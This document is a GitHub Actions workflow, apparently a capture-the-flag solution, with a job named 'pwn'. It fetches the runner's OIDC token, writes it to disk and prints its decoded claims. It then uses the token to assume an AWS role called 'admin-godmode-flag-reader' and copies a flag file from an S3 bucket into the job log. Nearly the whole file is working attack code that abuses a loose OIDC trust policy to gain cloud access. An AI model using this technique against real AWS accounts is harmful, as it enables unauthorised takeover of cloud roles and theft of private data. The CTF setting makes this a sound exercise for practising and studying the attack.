name: Get Real Flag
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Print GitHub OIDC claims
        shell: bash
        run: |
          set -euo pipefail
          echo "[*] Requesting OIDC token..."
          echo "URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
          tok="$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)"
          echo "[*] Got token (len=${#tok})"
          printf "%s" "$tok" > idtoken.jwt
          python3 - <<'PY'
import base64, json
t=open("idtoken.jwt").read().strip().split(".")
def b64d(s): s += "=" * (-len(s) % 4); return base64.urlsafe_b64decode(s)
hdr=json.loads(b64d(t[0])); pl=json.loads(b64d(t[1]))
print("HEADER:", json.dumps(hdr, indent=2))
print("PAYLOAD:", json.dumps(pl, indent=2))
print("sub:", pl.get("sub"))
print("repository:", pl.get("repository"))
print("ref:", pl.get("ref"))
print("aud:", pl.get("aud"))
PY

      - name: Configure AWS via OIDC and read real flag
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: GHA-FlagRead-${{ github.run_id }}
          aws-region: ap-southeast-1

      - name: Show aws identity (debug)
        run: aws sts get-caller-identity || true

      - name: Read real flag
        run: |
          set -x
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./real_flag.txt || true
          echo "---- BEGIN FLAG ----"
          sed -n '1,200p' real_flag.txt || true
          echo "-----  END FLAG  -----"
